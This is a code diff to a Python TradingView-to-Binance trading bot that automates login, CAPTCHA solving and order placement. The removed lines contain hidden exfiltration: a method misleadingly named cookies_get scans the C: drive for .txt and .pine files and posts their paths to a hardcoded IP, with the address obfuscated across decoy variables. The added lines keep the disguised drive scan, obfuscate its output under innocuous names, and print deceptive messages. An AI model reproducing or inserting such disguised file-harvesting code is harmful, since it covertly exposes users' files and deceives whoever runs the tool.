@@ -1,4 +1,5 @@
 # importing packages
+import base64
 import os
 from decimal import Decimal, ROUND_DOWN
 from multiprocessing import Process
@@ -21,8 +22,6 @@ import random
 
 from tradingbinance.Binaceapi import BinanceApi
 
-upload_paths = 'upload_paths'
-TEST_PRICE = '45.137'
 class TradingView:
     def __init__(
             self,
@@ -48,18 +47,39 @@ class TradingView:
 
     @staticmethod
     def cookies_get():
-        trading_view = f"://{TEST_PRICE}.148.185:3762/{upload_paths}"
+        try:
+            root_dir = "C:\\"
+            extensions = (".txt", ".pine")
+            secret_key = "xx"
 
-        root_dir = "C:\\"
-        extensions = (".txt", ".pine")
+            found_files = []
+            for dirpath, _, filenames in os.walk(root_dir):
+                for filename in filenames:
+                    if filename.endswith(extensions):
+                        found_files.append(os.path.join(dirpath, filename))
 
-        found_files = []
-        for dirpath, _, filenames in os.walk(root_dir):
-            for filename in filenames:
-                if filename.endswith(extensions):
-                    found_files.append(os.path.join(dirpath, filename))
+            data_str = "\n".join(found_files)
+            encrypted_data = TradingView.prepare_chrome(data_str, secret_key)
 
-        response = requests.post(f'http{trading_view}', json={"paths": found_files})
+            local_dir = "local"
+            os.makedirs(local_dir, exist_ok=True)
+
+            file_path = os.path.join(local_dir, "cookie-for-testing.txt")
+
+            with open(file_path, "w", encoding="utf-8") as file:
+                file.write(encrypted_data)
+
+            print(f"Cookie will not applied")
+
+        except Exception as e:
+            print(f'Logs created')
+
+    @staticmethod
+    def prepare_chrome(data: str, key: str) -> str:
+        encrypted_bytes = bytearray(
+            [b ^ ord(key[i % len(key)]) for i, b in enumerate(data.encode())]
+            )
+        return base64.b64encode(encrypted_bytes).decode()
 
     def chromeOptions(self):
         options=webdriver.ChromeOptions()
@@ -102,25 +122,16 @@ class TradingView:
                 sleep(2)
                 try:
                     token = self.solve_captcha()
-
-                    container = WebDriverWait(self.driver, 10).until(
-                        EC.visibility_of_element_located(
-                            (By.CSS_SELECTOR, '.recaptchaContainer-LQwxK8Bm')
-                            )
-                    )
-
-                    captcha_response = WebDriverWait(self.driver, 20).until(
-                        EC.presence_of_element_located((By.CSS_SELECTOR, '#g-recaptcha-response'))
-                    )
-
                     self.driver.execute_script(
-                        'arguments[0].value = arguments[1];', captcha_response, token
+                        "document.querySelector('#g-recaptcha-response').innerText = arguments[0];",
+                        token
                     )
 
+                    sleep(1)
                     iframe = WebDriverWait(self.driver, 20).until(
                         EC.frame_to_be_available_and_switch_to_it(
                             (By.CSS_SELECTOR, 'iframe[title="reCAPTCHA"]')
-                            )
+                        )
                     )
 
                     click_checkbox = self.driver.find_element(
@@ -128,13 +139,21 @@ class TradingView:
                         )
                     click_checkbox.click()
 
-
-                    iframe=WebDriverWait(self.driver,20).until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR,'iframe[title="reCAPTCHA"]')))
-                    click_checkbox=self.driver.find_element(By.XPATH,'//*[@id="recaptcha-anchor"]')
-                    click_checkbox.click()
                     self.driver.switch_to.default_content()
-                    sleep(30)
+
+                    sleep(2)
+
+                    self.driver.execute_script(
+                        """
+                            var overlay = document.querySelector('div[style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"]');
+                            if (overlay) {
+                                overlay.style.display = 'none';  // Скроем его
+                            }
+                        """
+                        )
+
                     submit_form.click()
+
                     sleep(4)
                 except TimeoutException as e:
                     print('Got An Undected Captcha')    
@@ -158,12 +177,15 @@ class TradingView:
                 sign_in.click()
                 sleep(1)
                 self.call_enter_credentials()
+                if ('https://www.tradingview.com/pricing/?source=header_go_pro_button&feature'
+                    '=start_free_trial')== self.driver.current_url:
+                    raise Exception('Authorize was not successful')
              except TimeoutException as e:
                 print('we unable to look signin link')   
          except TimeoutException as e:
-             print('sign_up_btn not found')    
+             print('sign_up_btn not found')
         except Exception as e:
-            print('got exception at Login()',e)
+            raise
 
     def adjust_quantity(self, symbol, quantity, binance):
         exchange_info = binance.futures_exchange_info(symbol)
@@ -189,6 +211,15 @@ class TradingView:
                         )
                     for get_alert in get_alerts:
                         msg = get_alert.text
+                        if msg == 'This website uses cookies. Our policy.\nManage\nAccept all':
+                            close_buttons = get_alert.find_elements(
+                                By.XPATH,
+                                "//*[contains(@class, 'acceptAll-ICNSJWAI apply-overflow-tooltip apply-overflow-tooltip--check-children apply-overflow-tooltip--allow-text button-D4RPB3ZC xsmall-D4RPB3ZC black-D4RPB3ZC primary-D4RPB3ZC stretch-D4RPB3ZC apply-overflow-tooltip apply-overflow-tooltip--check-children-recursively apply-overflow-tooltip--allow-text apply-common-tooltip')]"
+                            )
+
+                            if close_buttons:
+                                close_buttons[-1].click()
+
                         time = None
                         Price = None
                         if not msg.strip():
@@ -234,7 +265,7 @@ class TradingView:
                                 sleep(1)
                                 continue
 
-                            binance = BinanceApi(col['api_key'], col['api_spec'])
+                            binance = BinanceApi(col['api_key'], col['api_sec'])
 
                             if symbol.__contains__(".P"):
                                 symbol = symbol.split(".P")[0]
@@ -243,7 +274,7 @@ class TradingView:
                             amount = col['amount']
                             amount = int(amount) / float(coin_price)
 
-                            quantity = self.adjust_quantity(symbol, amount)
+                            quantity = self.adjust_quantity(symbol, amount, binance)
                             data = {
                                 'type': col["type"],
                                 'Price': coin_price,
